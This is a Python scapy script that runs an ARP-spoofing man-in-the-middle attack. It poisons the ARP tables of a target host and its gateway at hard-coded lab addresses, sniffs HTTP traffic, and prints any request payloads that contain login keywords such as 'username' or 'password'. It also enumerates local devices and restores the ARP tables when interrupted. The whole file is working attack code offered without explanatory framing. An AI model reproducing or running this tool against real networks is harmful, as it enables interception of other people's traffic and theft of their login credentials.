import scapy.all as scapy
from scapy_http import http
import re,os,time,sys

target_ip = "192.168.80.133"
gateway_ip = "192.168.80.2"
interface="ens33"
#undo: 1. get(target_ip/gateway_ip/interface) 
 
#---------------------------------ARP-------------------------------------#
def process_packet(packet):
	print(packet)
	packet.accept()
#--------------------------------SPOOF------------------------------------#
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]

    return (answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
#-------------------------------Sniff-------------------------------------#
def sniff(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname",
                    "user", "login", 
                    "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        login_info = get_login_info(packet)
        if login_info:
            print(login_info)

#---------------------------Device_Table---------------------------------#
print("\n")
x = os.popen("arp -n").read().replace("\n", " ")
iplist = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", x)
maclist = re.findall(r"(?:[0-9a-fA-F]:?){12}", x)
try:
	victim_ip = iplist[1]
	victim_mac = maclist[1]

except:
	print("Victim's info not found!")
	#exit
gateway_ip = iplist[0]
gateway_mac = maclist[0]
print("IP\t\t\tMAC Address\n-----------------------------------------")
for x, y in zip(iplist,maclist):
    if(x!=gateway_ip):
        print(x + "\t\t" + y)
#-------------------------Send_spoof_Packet------------------------------#
try:
    send_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packets_count += 2
        print("\nPackets sent: " + str(send_packets_count)+"\n\n"),
        sniff("ens33")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...."
          "Resetting ARP tables....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
#--------------------------------------------------------------------------#
sniff(interface)
